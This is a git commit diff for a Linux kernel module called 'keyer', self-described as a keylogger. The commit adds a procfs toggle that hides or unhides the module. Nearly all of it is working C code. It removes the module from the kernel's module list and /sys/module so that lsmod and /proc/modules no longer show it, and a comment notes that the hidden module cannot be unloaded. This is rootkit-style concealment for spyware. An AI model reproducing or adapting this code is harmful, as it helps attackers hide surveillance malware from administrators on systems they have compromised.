e6e80e4971ece3da4e0fa6ec584bfee81d8deaa3
faineance <faineance@users.noreply.github.com>
2014-11-18 19:33:35 +0000

    Added PROCFS interface to toggle hidden status

--- keyer.c
+++ keyer.c
@@ -1,24 +1,19 @@
-#include <linux/module.h>    // included for all kernel modules
 #include <linux/kernel.h>    // included for KERN_INFO
+#include <linux/module.h>    
 #include <linux/init.h>      // included for __init and __exit macros
+#include <linux/proc_fs.h>   
+#include <linux/seq_file.h>  
+static char module_hidden = 1;
 
-#define MIN(a,b) \
-   ({ typeof (a) _a = (a); \
-      typeof (b) _b = (b); \
-     _a < _b ? _a : _b; })
-
-static char module_hidden = 0;
 
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("faineance");
-MODULE_DESCRIPTION("A Simple Keylogger module");
 
+static struct proc_dir_entry *keyer_entry;
 
 void module_hide(void) 
 {
-	//Remove module from /sys/module which hides it in /proc/modules and lsmod
+	//Remove module entry from /sys/module which hides it in /proc/modules and lsmod
 	//While it is hidden the module cannot be uninstalled.
 	if (module_hidden) return;
 	//remove from modules list
@@ -41,18 +36,50 @@ void module_show(void)
 	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "keyer");
 	module_hidden = !module_hidden;
 }
+static int keyer_proc_show(struct seq_file *m, void *v) {
+	
+	if (module_hidden)
+	{
+		module_show();
+		seq_printf(m, "Hidden status toggled: No longer hidden \n");
+	}
+	else if (!module_hidden)
+	{
+		module_hide();
+		seq_printf(m, "Hidden status toggled: Hidden \n");
+	}
+	return 0;
+}
+static int keyer_proc_open(struct inode *inode, struct  file *file) {
+	return single_open(file, keyer_proc_show, NULL);
+}
+static const struct file_operations proc_file_fops = {
+	.owner = THIS_MODULE,
+	.open  = keyer_proc_open,
+	.read = seq_read,
+	.llseek = seq_lseek,
+	.release = single_release,
+};
+
 static int __init keyer_init(void)
 {
-    printk(KERN_INFO "Hello world!\n");
-    module_hide();
+	printk(KERN_INFO "Hello world!\n");
+	keyer_entry = proc_create("keyer", 0666, NULL, &proc_file_fops);
+	if (keyer_entry == NULL) return 0;
+	
+    
     return 0;    // Non-zero return means that the module couldn't be loaded.
 }
 
 static void __exit keyer_cleanup(void)
 {
-    printk(KERN_INFO "Cleaning up module.\n");
-}
+	remove_proc_entry("keyer", NULL);
+	printk(KERN_INFO "Cleaning up module.\n");
 
+}
 
 module_init(keyer_init);
 module_exit(keyer_cleanup);
+MODULE_AUTHOR("faineance");
+MODULE_DESCRIPTION("A Simple Keylogger module");
+MODULE_LICENSE("GPL");
